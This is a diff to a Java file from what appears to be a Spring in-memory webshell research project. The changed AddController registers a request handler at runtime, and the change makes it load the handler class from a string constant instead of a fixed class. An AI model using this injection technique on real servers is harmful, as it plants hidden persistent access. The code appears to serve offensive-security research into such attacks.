@@ -11,13 +11,14 @@ import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondit
 import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
 import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
 import org.springframework.web.servlet.support.RequestContextUtils;
-import org.su18.memshell.spring.other.TestController;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.Map;
+
+import static org.su18.memshell.spring.controller.DynamicUtils.CONTROLLER_CLASS_STRING;
 
 /**
  * 访问此接口动态添加 controller
@@ -66,7 +67,7 @@ public class AddController {
 		RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
 		RequestMappingInfo             info      = new RequestMappingInfo(url, condition, null, null, null, null, null);
 
-		Class<?> myClass = TestController.class;
+		Class<?> myClass = DynamicUtils.getClass(CONTROLLER_CLASS_STRING);
 
 		for (Method method : ms) {
 			if ("register".equals(method.getName())) {
